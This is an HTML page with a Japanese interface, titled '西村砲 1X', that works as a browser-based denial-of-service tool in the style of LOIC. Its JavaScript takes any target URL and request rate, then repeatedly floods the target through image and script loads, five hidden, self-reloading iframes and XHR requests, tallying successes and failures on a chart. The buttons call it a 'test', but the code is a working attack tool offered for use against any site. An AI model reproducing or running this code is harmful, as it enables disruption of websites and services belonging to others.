<!DOCTYPE html>
<html>

<head>
  <script src="https://code.jquery.com/jquery.min.js"></script>
  <script>
  function LOIC(target, port, requestsPerSecond)
        {
          var requested = 0;
          var succeeded = 0;
          var failed = 0;
          var isFiring = false;
          if(target.length == 0)
          {
            document.getElementById("errors").innerHTML = "URLを入力してください。";
          }
          else if(requestsPerSecond.length == 0)
          {
            document.getElementById("errors").innerHTML = "リクエストスピードを入力してください。";
          }
          else if(requestsPerSecond == "0" || requestsPerSecond == 0)
          {
            document.getElementById("errors").innerHTML = "リクエスト数は0に出来ません。";
          }
          else
          {
            if(port.length == 0 || port == 0 || port == "0")
            {
              port = 443;
            }
            var onFail = function()
            {
              failed++;
              document.getElementById("failed").innerHTML = failed;
            };
            var onSuccess = function()
            {
              succeeded++;
              document.getElementById("succeeded").innerHTML = succeeded;
            };
            var onRequest = function()
            {
              requested++;
              document.getElementById("requests").innerHTML = requested;
              var ctx = document.getElementById("myPieChart");
  var myPieChart = new Chart(ctx, {
    type: 'pie',
    data: {
      labels: ["成功", "失敗"], //データ項目のラベル
      datasets: [{
          backgroundColor: [
              "#ff0000",
              "#0000ff",
          ],
          data: [succeeded / requested * 100, failed / requested * 100] //グラフのデータ
      }]
    },
    options: {
      title: {
        display: true,
        text: "統計"
      },   
   animation: false
    }
  });
              
            };
            var DoS = function(addr, port)
            {
              function Atk(addr, port){
              var img = new Image();
              img.src = addr
              img.onload = ()=>{
                onSuccess()
                onRequest()
              }
              img.onerror = ()=>{
                onFail()
                onRequest()
              }
              var script = document.createElement("script")
              script.src = addr
              script.onload = ()=>{
                onSuccess()
                onRequest()
              }
              script.onerror = ()=>{
                onFail()
                onRequest()
              }
              var iframes = [
              document.getElementById("if1"),
              document.getElementById("if2"),
              document.getElementById("if3"),
              document.getElementById("if4"),
              document.getElementById("if5")
              ]
              for(const ifs of iframes){
                ifs.src = addr
                ifs.onload = () => {
                  ifs.contentWindow.location.reload(true)
                }
                  onSuccess()
                  onRequest()
              }
            };
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              Atk(addr, port)
              let request = new XMLHttpRequest()
              request.open('GET', addr);
              request.responseType = 'json';
              request.send();
              document.getElementById("RES").textContent = JSON.stringify(request.response);
            }
            document.getElementById("button").onclick = function()
            {
              if(isFiring)
              {
                document.getElementById("errors").innerHTML = "";
                document.getElementById("target").value = "";
                document.getElementById("port").value = "";
                document.getElementById("requestsPerSecond").value = "";
                clearInterval(fireInterval);
                isFiring = false;
                document.getElementById("button").innerHTML = "テスト開始";
                document.getElementById("status").innerHTML = "未使用";
              }
              else
              {
                document.getElementById("errors").innerHTML = "";
                document.getElementById("target").value = "";
                document.getElementById("port").value = "";
                document.getElementById("requestsPerSecond").value = "";
                isFiring = true;
                document.getElementById("button").innerHTML = "テスト終了";
                document.getElementById("status").innerHTML = "テスト中";
                fireInterval = setInterval(DoS, (1000 / parseInt(requestsPerSecond) |0));
              }
            }
          }
        }
$(function() {
    $('.container').outerHeight($(window).height());
});
$(window).on('resize',function(){
    winH = $(window).height();
    $('.container').outerHeight(winH);
});
        
$(function () {
    var container = $('.canvas-container');
    var ctx= $('#chart');
    ctx.attr('width', container.width());
    ctx.attr('height', 300);
});
  </script>
  <style>
  #errors{
      color: #f00;
      font-size: 10px;
    }
    *{
      margin: 0;
      overflow: hidden;
    }
            .status{
                color: #dcf3fc;
             font-weight: bold;
              background: #004175;
              font-style: italic;
              width: 200px;
            }
    .container {
      width: 100%;
      heigth: 100%;
      display: flex;
      justify-content: space-between;
    }
    
    .main-contents {
      width: 100%;
      heigth: 100%;
      background-color: #406f94;
    }
    
    .side-menu {
      width: 150px;
      heigth: 100%;
      background-image: url(https://cdn.discordapp.com/attachments/968049974136954890/968157394620260373/648E5C6A-BFF6-4425-882A-1258D63FDE30.png);
    }
    input{
      -webkit-appearance: none;
      -moz-appearance: none;
      appearance: none;
      -webkit-border-radius: 0;
      background: #5290bf;
      color: #dcf3fc;
      width: 100%;
    }
            button{
              -webkit-appearance: none;
      -moz-appearance: none;
      appearance: none;
      -webkit-border-radius: 0;
              color: #dcf3fc;
             font-weight: bold;
              background: #004175;
              font-style: italic;
            }
    #myPieChart{
      right:0px;
    }   
    .right{
      right:0px
    }
  </style>
  <title>西村砲 1X</title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.2/Chart.bundle.js"></script>
</head>

<body>
  <div class="container">
    <div class="side-menu">
    </div>
    <div class="main-contents">
      <input type="url" name="target" id="target" placeholder="URLを入力">
      <br>
      <input type="number" name="port" id="port" placeholder="ポート（任意）">
      <br>
      <input type="number" name="requestsPerSecond" id="requestsPerSecond" placeholder="リクエスト間隔（秒）">
      <br>
      <button name="button" id="button" onclick="javascript:LOIC(document.getElementById('target').value, document.getElementById('port').value, document.getElementById('requestsPerSecond').value);">テスト</button>
      <br>
      <sup name="errors" id="errors">
      </sup>
      <br>
      <div class="status">リクエスト数:
        <span name="requests" id="requests"></span>
        <br>成功数:
        <span name="succeeded" id="succeeded"></span>
        <br>失敗数:
        <span name="failed" id="failed"></span>
        <br>Status:
        <span name="status" id="status">未使用</span>
      </div>
      <br>
      <span style="display:none;">
        <iframe id="if1" height="5px" width="5px">
        </iframe>
        <iframe id="if2" height="5px" width="5px">
        </iframe>
        <iframe id="if3" height="5px" width="5px">
        </iframe>
        <iframe id="if4" height="5px" width="5px">
        </iframe>
        <iframe id="if5" height="5px" width="5px">
        </iframe>
      </span>
      <h1 style="color: #dcf3fc;
             font-weight: bold;">Response</h1>
      <div id="RES">
      </div>
      <div style="position: relative;
    width:  250px;
    height: 300px;
    overflow: hidden;
    margin:20px;">
        <canvas id="myPieChart">
        </canvas>
      </div>
    </div>
  </div>
</body>

</html>
